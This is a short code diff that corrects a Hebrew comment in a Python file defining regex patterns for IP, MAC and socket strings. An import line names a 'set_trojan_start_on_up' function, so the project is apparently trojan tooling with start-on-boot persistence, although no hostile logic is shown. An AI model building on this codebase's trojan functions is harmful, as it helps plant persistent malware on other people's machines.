@@ -7,7 +7,7 @@ from Api.ManaIO import set_trojan_start_on_up, CLEANUP
 from Api.protocol import NOOD_NAME, NOOD_PATH, H_T_NAME
 
 
-# פורמטים כללים
+# פורמטים כלליים
 FORMAT_IP   = r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'
 FORMAT_MAC  = r'[\x00-\x7F]{2}-[\x00-\x7F]{2}-[\x00-\x7F]{2}-[\x00-\x7F]{2}-[\x00-\x7F]{2}-[\x00-\x7F]{2}'
 FORMAT_SOCK = FORMAT_IP+r"\:\d{0,9}"
